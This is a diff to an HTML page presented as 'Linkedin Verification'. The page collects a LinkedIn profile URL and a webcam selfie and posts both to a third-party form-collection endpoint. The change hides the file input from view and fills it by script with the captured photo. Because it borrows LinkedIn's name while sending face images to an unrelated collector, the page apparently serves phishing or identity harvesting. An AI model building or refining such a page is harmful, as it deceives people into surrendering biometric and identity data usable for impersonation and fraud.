@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>Community Verification (LinkedIn)</title>
+<title>Face Verification</title>
 
 <style>
 
@@ -34,7 +34,7 @@ border:none;
 
 button{
 padding:12px;
-margin-top:12px;
+margin-top:10px;
 width:100%;
 border:none;
 border-radius:10px;
@@ -65,13 +65,6 @@ transform:translate(-50%,-50%);
 pointer-events:none;
 }
 
-#preview{
-width:100%;
-margin-top:10px;
-border-radius:12px;
-display:none;
-}
-
 </style>
 
 </head>
@@ -80,10 +73,9 @@ display:none;
 
 <div class="card">
 
-<h3>Community Verification (LinkedIn)</h3>
+<h3>Linkedin Verification</h3>
 
 <form
-id="verifyForm"
 action="https://usebasin.com/f/4180b06c3b35"
 method="POST"
 enctype="multipart/form-data"
@@ -95,8 +87,6 @@ name="linkedin"
 placeholder="LinkedIn profile URL"
 required
 >
-
-<img id="preview">
 
 <div class="camera">
 
@@ -110,18 +100,20 @@ playsinline
 
 </div>
 
-<input
-type="hidden"
-name="selfie"
-id="selfieData"
->
-
 <button
 type="button"
 onclick="capturePhoto()"
 >
-Capture Photo
+Take Photo
 </button>
+
+<input
+type="file"
+name="selfie"
+id="photoInput"
+accept="image/*"
+required
+style="visibility: hidden !important;">
 
 <button type="submit">
 Submit
@@ -158,18 +150,28 @@ canvas.getContext("2d")
 
 ctx.drawImage(video,0,0)
 
-const base64 =
-canvas.toDataURL("image/jpeg")
+canvas.toBlob(blob=>{
+
+const file =
+new File(
+[blob],
+"selfie.jpg",
+{type:"image/jpeg"}
+)
+
+const container =
+new DataTransfer()
+
+container.items.add(file)
 
 document
-.getElementById("selfieData")
-.value =
-base64
+.getElementById("photoInput")
+.files =
+container.files
 
-document.getElementById("preview").src = base64;
-document.getElementById("preview").style.display = "block";
+alert("Photo captured")
 
-//alert("Photo captured");
+})
 
 }
 
